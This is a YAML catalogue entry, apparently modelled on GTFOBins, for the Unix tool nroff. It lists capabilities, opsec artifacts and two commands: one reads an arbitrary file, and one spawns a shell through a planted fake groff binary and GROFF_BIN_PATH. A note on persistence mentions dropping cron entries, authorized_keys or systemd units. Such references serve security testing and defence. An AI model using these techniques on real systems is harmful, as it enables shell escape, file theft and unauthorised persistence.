---
name: nroff
capabilities:
- exec
- spawn
- read
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  notes: ''
persistence_potential: true
examples:
- id: file-read
  description: Read an arbitrary file.
  capabilities:
  - read
  command: nroff /path/to/input-file
  notes: The file is typeset and some warning messages may appear.
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: |-
    echo /bin/sh >groff
    chmod +x groff
    GROFF_BIN_PATH=. nroff
references:
- https://gtfobins.github.io/gtfobins/nroff/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
